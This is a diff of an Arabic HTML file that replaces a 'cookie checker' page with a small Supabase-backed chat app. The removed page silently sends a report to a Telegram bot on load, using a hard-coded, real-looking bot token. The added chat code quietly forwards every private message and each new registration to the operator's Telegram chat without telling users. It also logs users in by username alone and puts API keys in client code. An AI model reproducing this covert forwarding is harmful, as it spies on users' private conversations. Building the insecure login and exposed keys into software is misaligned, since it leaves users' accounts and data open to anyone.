@@ -3,193 +3,545 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فحص ملفات تعريف الارتباط | Cookie Checker</title>
+    <title>دردشة P2P</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         :root {
-            --primary-color: #6366f1;
-            --secondary-color: #a855f7;
-            --bg-dark: #0f172a;
-            --glass-bg: rgba(255, 255, 255, 0.05);
-            --glass-border: rgba(255, 255, 255, 0.1);
-            --text-main: #f8fafc;
-            --text-dim: #94a3b8;
+            --bg-color: #121212;
+            --card-bg: #1e1e1e;
+            --text-color: #e0e0e0;
+            --primary-color: #00a884; /* WhatsApp Green */
+            --secondary-color: #25d366;
+            --border-color: #333333;
+            --input-bg: #2a2a2a;
+            --button-hover: #008a6b;
+            --error-color: #f44336;
+            --success-color: #4caf50;
+            --message-sent-bg: #005c4b;
+            --message-received-bg: #333333;
         }
 
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Cairo', sans-serif;
         }
 
         body {
-            background-color: var(--bg-dark);
-            background-image: 
-                radial-gradient(at 0% 0%, rgba(99, 102, 241, 0.15) 0px, transparent 50%),
-                radial-gradient(at 100% 100%, rgba(168, 85, 247, 0.15) 0px, transparent 50%);
-            height: 100vh;
+            background-color: var(--bg-color);
+            color: var(--text-color);
             display: flex;
             justify-content: center;
             align-items: center;
-            color: var(--text-main);
+            min-height: 100vh;
+            padding: 10px;
             overflow: hidden;
         }
 
-        .container {
-            background: var(--glass-bg);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border: 1px solid var(--glass-border);
-            border-radius: 24px;
-            padding: 3rem;
-            width: 90%;
-            max-width: 450px;
+        .app-container {
+            width: 100%;
+            max-width: 420px;
+            height: 95vh;
+            max-height: 800px;
+            background-color: var(--card-bg);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .screen {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* Auth Screen */
+        #auth-screen {
+            padding: 40px 30px;
+            justify-content: center;
+        }
+
+        #auth-screen h1 {
+            color: var(--primary-color);
+            margin-bottom: 30px;
+            font-size: 2rem;
             text-align: center;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            transition: transform 0.3s ease;
         }
 
-        .container:hover {
-            transform: translateY(-5px);
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right;
         }
 
-        .icon-box {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: var(--text-color);
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            font-size: 1rem;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-group input:focus {
+            border-color: var(--primary-color);
+            outline: none;
+        }
+
+        .btn {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background-color: var(--button-hover);
+        }
+
+        .message-box {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            text-align: center;
+            display: none; /* Hidden by default */
+        }
+
+        .message-box.error {
+            background-color: rgba(244, 67, 54, 0.2);
+            color: var(--error-color);
+            display: block;
+        }
+
+        .message-box.success {
+            background-color: rgba(76, 175, 80, 0.2);
+            color: var(--success-color);
+            display: block;
+        }
+
+        /* Home Screen */
+        #home-screen {
+            padding: 20px;
+        }
+
+        #home-screen h2 {
+            color: var(--primary-color);
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+        }
+
+        .logout-btn {
+            background: none;
+            border: none;
+            color: var(--error-color);
+            cursor: pointer;
+            font-size: 0.9rem;
+            position: absolute;
+            top: 20px;
+            left: 20px;
+        }
+
+        /* Chat Screen */
+        #chat-screen {
+            flex-grow: 1;
+        }
+
+        .chat-header {
+            background-color: var(--card-bg);
+            padding: 15px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+            flex-shrink: 0;
+        }
+
+        .back-btn {
+            background: none; border: none; color: var(--primary-color); font-size: 1.5rem; cursor: pointer;
+        }
+
+        .chat-messages {
+            flex-grow: 1;
+            padding: 15px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .message {
+            display: flex;
+            flex-direction: column;
+            max-width: 85%;
+            padding: 8px 12px;
+            border-radius: 10px;
+            word-wrap: break-word;
+        }
+
+        .message.sent {
+            align-self: flex-end;
+            background-color: var(--message-sent-bg);
+            color: white;
+            border-bottom-right-radius: 2px;
+        }
+
+        .message.received {
+            align-self: flex-start;
+            background-color: var(--message-received-bg);
+            color: var(--text-color);
+            border-bottom-left-radius: 2px;
+        }
+
+        .message-content {
+            font-size: 1rem;
+        }
+
+        .message-timestamp {
+            font-size: 0.7rem;
+            color: #a0a0a0;
+            align-self: flex-end;
+            margin-top: 4px;
+        }
+
+        .chat-input-area {
+            display: flex;
+            padding: 10px;
+            border-top: 1px solid var(--border-color);
+            background-color: var(--card-bg);
+        }
+
+        .chat-input-area input {
+            flex-grow: 1;
+            padding: 12px;
+            border: none;
             border-radius: 20px;
-            margin: 0 auto 1.5rem;
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            font-size: 1rem;
+            margin-left: 10px;
+        }
+        .chat-input-area input:focus { outline: none; }
+
+        .chat-input-area button {
+            background-color: var(--primary-color);
+            color: white;
+            width: 44px;
+            height: 44px;
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 1.5rem;
+            transition: background-color 0.3s ease;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-size: 2.5rem;
-            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
         }
 
-        h1 {
-            font-size: 1.8rem;
-            margin-bottom: 1rem;
-            background: linear-gradient(to right, #fff, #94a3b8);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        .chat-input-area button:hover {
+            background-color: var(--button-hover);
         }
 
-        p {
-            color: var(--text-dim);
-            line-height: 1.6;
-            margin-bottom: 2rem;
-        }
-
-        .status-badge {
-            display: inline-block;
-            padding: 0.75rem 1.5rem;
-            border-radius: 50px;
-            font-weight: 600;
-            font-size: 1.1rem;
-            letter-spacing: 0.5px;
-            margin-bottom: 1rem;
-            animation: fadeIn 0.5s ease-out forwards;
-        }
-
-        .enabled {
-            background: rgba(34, 197, 94, 0.1);
-            color: #4ade80;
-            border: 1px solid rgba(34, 197, 94, 0.2);
-        }
-
-        .disabled {
-            background: rgba(239, 68, 68, 0.1);
-            color: #f87171;
-            border: 1px solid rgba(239, 68, 68, 0.2);
-        }
-
-        .footer-info {
-            font-size: 0.85rem;
-            color: var(--text-dim);
-            margin-top: 2rem;
-            opacity: 0.7;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
-        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="icon-box">🍪</div>
-        <h1>فحص ملفات تعريف الارتباط</h1>
-        <p>نقوم الآن بالتحقق من حالة الـ Cookies في متصفحك وإرسال تقرير فني سريع.</p>
-        
-        <div id="status" class="status-badge">جاري الفحص...</div>
-        
-        <div class="footer-info">
-            تم الفحص تلقائياً بواسطة نظام التحقق الذكي
+    <div class="app-container">
+        <!-- Auth Screen -->
+        <div id="auth-screen" class="screen">
+            <h1>دردشة P2P</h1>
+            <div class="form-group">
+                <label for="username">اسم المستخدم</label>
+                <input type="text" id="username" placeholder="اختر اسم مستخدم فريد">
+            </div>
+            <button class="btn" id="register-btn">تسجيل / دخول</button>
+            <div id="auth-message" class="message-box"></div>
+        </div>
+
+        <!-- Home Screen -->
+        <div id="home-screen" class="screen hidden">
+            <h2>ابدأ محادثة جديدة</h2>
+            <p id="welcome-user" style="text-align: center; margin-bottom: 20px; color: var(--text-dim);"></p>
+            <div class="form-group">
+                <label for="chat-partner-username">اسم مستخدم الطرف الآخر</label>
+                <input type="text" id="chat-partner-username" placeholder="أدخل اسم المستخدم للمحادثة">
+            </div>
+            <button class="btn" id="start-chat-btn">افتح المحادثة</button>
+            <div id="home-message" class="message-box"></div>
+            <button class="logout-btn" id="logout-btn">تسجيل الخروج</button>
+        </div>
+
+        <!-- Chat Screen -->
+        <div id="chat-screen" class="screen hidden">
+            <div class="chat-header">
+                <button id="back-to-home-btn" class="back-btn">←</button>
+                <span id="chat-partner-display"></span>
+            </div>
+            <div class="chat-messages" id="chat-messages"></div>
+            <div class="chat-input-area">
+                <button id="send-message-btn">➤</button>
+                <input type="text" id="message-input" placeholder="اكتب رسالتك...">
+            </div>
         </div>
     </div>
 
     <script>
-        // إعدادات تلغرام (يرجى استبدال القيم أدناه بالقيم الحقيقية الخاصة بك)
-        const TELEGRAM_CONFIG = {
-            botToken: '8468116606:AAFI0NKNJhvRE_sugFfmkUSNkvlMu1Xi-5k',
-            chatId: '6612813200'
-        };
+        // --- CONFIGURATION ---
+        // 1. Supabase: Create a project, get URL and anon key.
+        //    Create table `messages` with: id (uuid, primary), sender_username (text), 
+        //    receiver_username (text), message_content (text), created_at (timestamptz, default now())
+        const SUPABASE_URL = 'YOUR_SUPABASE_URL';
+        const SUPABASE_KEY = 'YOUR_SUPABASE_KEY';
 
-        function checkCookies() {
-            const statusDiv = document.getElementById('status');
-            const isEnabled = navigator.cookieEnabled;
-            
-            let message = "";
+        // 2. JSONBin.io: Create an account, create a new private bin, get API key and Bin ID.
+        const JSONBIN_API_KEY = 'YOUR_JSONBIN_API_KEY';
+        const JSONBIN_BIN_ID = 'YOUR_JSONBIN_BIN_ID';
 
-            if (isEnabled) {
-                statusDiv.innerText = "ملفات تعريف الارتباط: مفعلة ✅";
-                statusDiv.classList.add('enabled');
-                message = "🚀 تنبيه: ملفات تعريف الارتباط (Cookies) مفعلة في متصفح المستخدم.";
-            } else {
-                statusDiv.innerText = "ملفات تعريف الارتباط: معطلة ❌";
-                statusDiv.classList.add('disabled');
-                message = "⚠️ تنبيه: ملفات تعريف الارتباط (Cookies) غير مفعلة في متصفح المستخدم.";
-            }
+        // 3. Telegram: Create a bot with @BotFather, get token. Get your chat ID.
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
 
-            sendToTelegram(message);
+        // --- INITIALIZATION ---
+        const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        let currentUser = null;
+        let currentChatPartner = null;
+        let messageSubscription = null;
+
+        // --- UI ELEMENTS ---
+        const authScreen = document.getElementById('auth-screen');
+        const homeScreen = document.getElementById('home-screen');
+        const chatScreen = document.getElementById('chat-screen');
+        const screens = { auth: authScreen, home: homeScreen, chat: chatScreen };
+
+        const usernameInput = document.getElementById('username');
+        const registerBtn = document.getElementById('register-btn');
+        const authMessage = document.getElementById('auth-message');
+
+        const welcomeUser = document.getElementById('welcome-user');
+        const chatPartnerUsernameInput = document.getElementById('chat-partner-username');
+        const startChatBtn = document.getElementById('start-chat-btn');
+        const logoutBtn = document.getElementById('logout-btn');
+        const homeMessage = document.getElementById('home-message');
+
+        const chatPartnerDisplay = document.getElementById('chat-partner-display');
+        const backToHomeBtn = document.getElementById('back-to-home-btn');
+        const chatMessagesDiv = document.getElementById('chat-messages');
+        const messageInput = document.getElementById('message-input');
+        const sendMessageBtn = document.getElementById('send-message-btn');
+
+        // --- UTILITY FUNCTIONS ---
+        function showScreen(screenName) {
+            Object.values(screens).forEach(s => s.classList.add('hidden'));
+            screens[screenName].classList.remove('hidden');
         }
 
-        async function sendToTelegram(text) {
-            // التحقق من وجود التوكن والـ ID قبل الإرسال لتجنب الأخطاء في حال عدم التعديل
-            if (TELEGRAM_CONFIG.botToken === 'YOUR_BOT_TOKEN' || TELEGRAM_CONFIG.chatId === 'YOUR_CHAT_ID') {
-                console.warn("Telegram Bot Token or Chat ID is not set.");
+        function displayMessage(element, message, type) {
+            element.textContent = message;
+            element.className = `message-box ${type}`;
+        }
+
+        async function sendTelegramNotification(text) {
+            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') return;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
+                });
+            } catch (error) { console.error("Telegram Error:", error); }
+        }
+
+        // --- JSONBIN.IO LOGIC ---
+        async function getJsonBinUsers() {
+            if (JSONBIN_API_KEY === 'YOUR_JSONBIN_API_KEY' || JSONBIN_BIN_ID === 'YOUR_JSONBIN_BIN_ID') {
+                displayMessage(authMessage, 'JSONBin.io API Key or Bin ID not configured.', 'error');
+                return null;
+            }
+            try {
+                const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
+                    headers: { 'X-Master-Key': JSONBIN_API_KEY }
+                });
+                if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
+                const data = await res.json();
+                return data.record.users || [];
+            } catch (e) {
+                console.error("JSONBin fetch error:", e);
+                displayMessage(authMessage, 'Could not fetch user data. Check Bin ID.', 'error');
+                return null;
+            }
+        }
+
+        async function updateJsonBinUsers(users) {
+            try {
+                await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json', 'X-Master-Key': JSONBIN_API_KEY },
+                    body: JSON.stringify({ users: users })
+                });
+            } catch (e) { console.error("JSONBin update error:", e); }
+        }
+
+        // --- SUPABASE LOGIC ---
+        async function getMessages(user1, user2) {
+            const { data, error } = await supabase.from('messages')
+                .select('*')
+                .or(`and(sender_username.eq.${user1},receiver_username.eq.${user2}),and(sender_username.eq.${user2},receiver_username.eq.${user1})`)
+                .order('created_at', { ascending: true });
+            if (error) { console.error('Error fetching messages:', error); return []; }
+            return data;
+        }
+
+        async function sendMessage(sender, receiver, content) {
+            const { error } = await supabase.from('messages').insert([{ sender_username: sender, receiver_username: receiver, message_content: content }]);
+            if (error) { console.error('Error sending message:', error); return false; }
+            sendTelegramNotification(`رسالة من [${sender}] إلى [${receiver}]: ${content}`);
+            return true;
+        }
+
+        function subscribeToMessages() {
+            if (messageSubscription) messageSubscription.unsubscribe();
+            messageSubscription = supabase.channel(`messages-for-${currentUser}`)
+                .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'messages' }, payload => {
+                    const newMessage = payload.new;
+                    if (newMessage.receiver_username === currentUser && newMessage.sender_username === currentChatPartner) {
+                        appendMessageToChat(newMessage);
+                    }
+                }).subscribe();
+        }
+
+        // --- UI LOGIC ---
+        function appendMessageToChat(message) {
+            const msgEl = document.createElement('div');
+            msgEl.classList.add('message', message.sender_username === currentUser ? 'sent' : 'received');
+            const content = document.createElement('div');
+            content.classList.add('message-content');
+            content.textContent = message.message_content;
+            const timestamp = document.createElement('div');
+            timestamp.classList.add('message-timestamp');
+            timestamp.textContent = new Date(message.created_at).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
+            msgEl.appendChild(content);
+            msgEl.appendChild(timestamp);
+            chatMessagesDiv.appendChild(msgEl);
+            chatMessagesDiv.scrollTop = chatMessagesDiv.scrollHeight;
+        }
+
+        async function loadChat(partnerUsername) {
+            const users = await getJsonBinUsers();
+            if (!users.includes(partnerUsername)) {
+                displayMessage(homeMessage, 'هذا المستخدم غير موجود.', 'error');
                 return;
             }
-
-            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
-            
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CONFIG.chatId,
-                        text: text,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                if (response.ok) {
-                    console.log("Status sent to Telegram successfully.");
-                } else {
-                    console.error("Failed to send status to Telegram.");
-                }
-            } catch (error) {
-                console.error("Error sending to Telegram:", error);
-            }
+            currentChatPartner = partnerUsername;
+            chatPartnerDisplay.textContent = `محادثة مع ${currentChatPartner}`;
+            chatMessagesDiv.innerHTML = '';
+            const messages = await getMessages(currentUser, currentChatPartner);
+            messages.forEach(appendMessageToChat);
+            subscribeToMessages();
+            showScreen('chat');
         }
 
-        // بدء الفحص عند تحميل الصفحة
-        window.onload = checkCookies;
+        // --- EVENT LISTENERS ---
+        registerBtn.addEventListener('click', async () => {
+            const username = usernameInput.value.trim().toLowerCase();
+            if (!username) return displayMessage(authMessage, 'الرجاء إدخال اسم مستخدم.', 'error');
+            
+            const users = await getJsonBinUsers();
+            if (users === null) return;
+
+            if (users.includes(username)) {
+                // Login
+                currentUser = username;
+                localStorage.setItem('currentUser', currentUser);
+                welcomeUser.textContent = `مرحباً بك، ${currentUser}`;
+                showScreen('home');
+            } else {
+                // Register
+                users.push(username);
+                await updateJsonBinUsers(users);
+                currentUser = username;
+                localStorage.setItem('currentUser', currentUser);
+                displayMessage(authMessage, `تم التسجيل بنجاح! مرحباً بك يا ${currentUser}!`, 'success');
+                sendTelegramNotification(`مستخدم جديد تم تسجيله: ${currentUser}`);
+                setTimeout(() => {
+                    welcomeUser.textContent = `مرحباً بك، ${currentUser}`;
+                    showScreen('home');
+                    authMessage.classList.remove('success');
+                    authMessage.textContent = '';
+                }, 1500);
+            }
+        });
+
+        startChatBtn.addEventListener('click', () => {
+            const partnerUsername = chatPartnerUsernameInput.value.trim().toLowerCase();
+            if (!partnerUsername) return displayMessage(homeMessage, 'الرجاء إدخال اسم المستخدم للمحادثة.', 'error');
+            if (partnerUsername === currentUser) return displayMessage(homeMessage, 'لا يمكنك الدردشة مع نفسك!', 'error');
+            loadChat(partnerUsername);
+        });
+
+        sendMessageBtn.addEventListener('click', async () => {
+            const content = messageInput.value.trim();
+            if (content && currentUser && currentChatPartner) {
+                const sent = await sendMessage(currentUser, currentChatPartner, content);
+                if (sent) {
+                    appendMessageToChat({ sender_username: currentUser, message_content: content, created_at: new Date().toISOString() });
+                    messageInput.value = '';
+                }
+            }
+        });
+        messageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessageBtn.click(); });
+
+        logoutBtn.addEventListener('click', () => {
+            localStorage.removeItem('currentUser');
+            currentUser = null;
+            if(messageSubscription) messageSubscription.unsubscribe();
+            showScreen('auth');
+        });
+
+        backToHomeBtn.addEventListener('click', () => {
+            currentChatPartner = null;
+            if(messageSubscription) messageSubscription.unsubscribe();
+            showScreen('home');
+        });
+
+        // --- APP INITIALIZATION ---
+        document.addEventListener('DOMContentLoaded', () => {
+            const storedUser = localStorage.getItem('currentUser');
+            if (storedUser) {
+                currentUser = storedUser;
+                welcomeUser.textContent = `مرحباً بك، ${currentUser}`;
+                showScreen('home');
+            } else {
+                showScreen('auth');
+            }
+        });
     </script>
 </body>
 </html>
